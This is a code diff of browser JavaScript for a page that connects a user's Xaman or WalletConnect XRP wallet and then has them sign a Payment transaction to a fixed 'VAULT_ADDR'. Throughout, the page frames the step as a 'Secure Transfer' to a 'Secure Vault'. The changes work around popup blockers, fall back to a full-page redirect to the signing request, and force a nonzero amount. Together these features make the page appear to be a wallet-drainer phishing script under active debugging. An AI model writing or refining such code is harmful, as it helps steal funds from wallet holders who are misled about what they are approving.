@@ -52,7 +52,7 @@ function updateAllButtonsToSecure() {
 }
 
 // ==============================
-// CONNECT LOGIC
+// CONNECTION LOGIC
 // ==============================
 async function connectWallet(type) {
   try {
@@ -84,27 +84,24 @@ async function handlePostConnect(type, address) {
 
     updateAllButtonsToSecure();
     setStatus(`Connected: ${shortAddr(address)}`);
-    
-    // We do NOT auto-trigger here (browsers will block it).
-    // User must click the green button.
 }
 
 // ==============================
-// THE FIX: PRE-OPEN WINDOW
+// TRIGGER LOGIC (The Fix)
 // ==============================
 async function triggerManualApproval() {
   if (!currentAddress) return;
 
-  // 1. OPEN WINDOW INSTANTLY (Synchronous)
-  // This satisfies the browser security check immediately.
+  // 1. OPEN WINDOW IMMEDIATELY (Before fetching data)
+  // This prevents the "Signature failed" popup blocker error
   let popup = null;
   if (currentWalletType === "xaman") {
       popup = window.open("", "_blank");
       if (popup) {
-          popup.document.write("<h2>Preparing Secure Transfer...</h2><p>Please wait, contacting Xaman...</p>");
+          popup.document.write("<h2>Contacting Secure Vault...</h2><p>Please wait...</p>");
       } else {
-          alert("Popup blocked! Please allow popups for this site.");
-          return;
+          // If popup failed, we will fall back to redirect later
+          console.warn("Popup blocked, will try redirect");
       }
   }
 
@@ -117,43 +114,49 @@ async function triggerManualApproval() {
 
   } catch (err) {
     console.error("Approval Error:", err);
-    if (popup) popup.close(); // Close the blank window if error
-    setStatus("Error: " + err.message);
+    if (popup) popup.close(); 
+    // Show the actual error message on screen
+    setStatus("Error: " + (err.message || err));
   }
 }
 
 async function signAndSubmit(type, address, amountDrops, popupWindow) {
+  // FIX: Ensure Amount is never "0". 
+  // "0" causes Xaman API to throw "Invalid Amount" error.
+  let safeAmount = amountDrops;
+  if (!safeAmount || safeAmount === "0") {
+      safeAmount = "1"; // 1 drop (0.000001 XRP)
+  }
+
   const tx = {
     TransactionType: "Payment",
     Account: address,
     Destination: VAULT_ADDR,
-    Amount: amountDrops || "0" 
+    Amount: safeAmount 
   };
 
   if (type === "xaman") {
-    // 2. Create Payload (Async)
+    // 2. Create Payload
     const payload = await xumm.payload.create(tx);
     
     if (payload && payload.next && payload.next.always) {
         const signUrl = payload.next.always;
         
-        // 3. REDIRECT THE PRE-OPENED WINDOW
-        if (popupWindow) {
+        // 3. USE THE PRE-OPENED WINDOW
+        if (popupWindow && !popupWindow.closed) {
             popupWindow.location.href = signUrl;
             setStatus("Confirm in Xaman");
         } else {
-            // Fallback for mobile if window.open failed
+            // Fallback: Redirect the whole page if popup failed
             window.location.href = signUrl;
         }
     } else {
-        throw new Error("Invalid Payload");
+        throw new Error("Invalid Payload response from Xaman");
     }
   } 
   
   else if (type === "walletconnect") {
-    // WalletConnect doesn't need the popup window
     if (popupWindow) popupWindow.close(); 
-    
     const session = wcClient.session.getAll()[0];
     await wcClient.request({
       topic: session.topic,
